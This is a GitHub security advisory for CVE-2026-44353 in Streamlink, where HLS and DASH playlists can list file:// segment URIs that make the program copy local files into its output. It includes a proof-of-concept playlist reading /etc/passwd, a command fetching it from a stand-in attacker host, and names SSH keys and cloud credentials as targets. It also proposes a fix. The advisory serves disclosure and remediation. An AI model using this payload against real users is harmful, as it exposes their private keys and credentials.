# [M] Streamlink has an arbitrary local file read via file:// URI in HLS and DASH

## Summary
Severity: Medium
Advisory: GHSA-hgqw-6m45-hw5f
CVE: CVE-2026-44353
CWE: CWE-22, CWE-73
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-hgqw-6m45-hw5f
Type: github-advisory

## Affected
- PyPI: `streamlink` — affected >=0 <8.4.0

## Details
## Summary

Streamlink's HLS and DASH parsers do not validate the URI scheme of segment entries and other resources. A remote `.m3u8` HLS playlist or `.mpd` DASH manifest can list `file:///path/to/file` as a segment, and streamlink will read that local file and write its contents to the output stream.

Confirmed on streamlink 8.3.0 (latest release at time of report).

## Description

Segment URIs from an HLS playlist or DASH manifest are passed to the worker without any scheme check. The underlying HTTP session accepts `file://` URIs, which resolve against the local filesystem. There is no scheme allowlist at the parser level, so any path readable by the streamlink process is treated as a valid segment.

The attacker does not need local access to the victim. A playlist/manifest hosted on an attacker-controlled server, fetched by streamlink on the victim's machine, is enough to trigger the read.

## Impact

A remote attacker hosting a malicious playlist/manifest can make any client running streamlink against that URL read arbitrary local files within the streamlink process's read scope and write them into the output file.

Reachable files depend on the user running streamlink. Typical targets: `~/.ssh/id_*` private keys, `~/.aws/credentials`, shell history, application config files holding API tokens, and world-readable system files like `/etc/passwd`.

### Affected scenarios

- Server-side or automated deployments (recording bots, media pipelines, CI jobs processing playlists). The output file is often uploaded, logged, or otherwise exposed, which gives direct disclosure to attacker-reachable locations.
- Interactive desktop use. File contents land on the victim's disk and can leak through secondary channels: the user sharing the recording, cloud sync, backup, etc.

This bug does not on its own send file contents back to the attacker. The disclosure goes to the output sink. Full exfiltration depends on what happens to that file afterward.

## Steps to reproduce

Tested on streamlink 8.3.0, Linux (Kali).

1. Save as `playlist.m3u8`:

    ```m3u
    #EXTM3U
    #EXT-X-VERSION:3
    #EXT-X-TARGETDURATION:5
    #EXT-X-PLAYLIST-TYPE:VOD
    #EXTINF:5.0,
    file:///etc/passwd
    #EXT-X-ENDLIST
    ```

2. Host the playlist on a remote server reachable by the victim. For testing, a VPS, a tunnel (cloudflared, ngrok), or a static host like GitHub Pages all work.

3. On the victim machine:

    ```sh
    streamlink "hls://https://attacker-host.example/playlist.m3u8" best -o /tmp/proof.ts
    ```

3. Inspect the output:

    ```sh
    cat /tmp/proof.ts
    ```

4. The output contains the contents of `/etc/passwd` from the machine running streamlink.

### Local reproduction (equivalent, simpler to set up):

```sh
python3 -m http.server 8080    # in directory containing playlist.m3u8
streamlink "hls://http://127.0.0.1:8080/playlist.m3u8" best -o /tmp/proof.ts
cat /tmp/proof.ts
```

The remote case was confirmed independently using a tunnel.

## Proposed remediation

Allowlist http and https for segment URIs in the HLS parser. Reject any other scheme (file, ftp, data, etc.) at parse time, before the URI reaches the fetcher.

The check needs to cover:

- Segment URIs in the top-level manifest.
- Segment URIs in nested manifests pulled during playback (variant playlists referenced from a master playlist).
- Other URI fields the fetcher consumes — `#EXT-X-KEY` and `#EXT-X-MAP` URIs at minimum. Worth auditing the rest for the same issue.

The check belongs in the parser, not the fetcher. Putting it next to the untrusted input means downstream callers don't each need to re-implement it, and any future fetcher path inherits the protection by default.

## References
- https://github.com/streamlink/streamlink/security/advisories/GHSA-hgqw-6m45-hw5f
- https://nvd.nist.gov/vuln/detail/CVE-2026-44353
- https://github.com/pypa/advisory-database/tree/main/vulns/streamlink/PYSEC-2026-180.yaml
- https://github.com/streamlink/streamlink
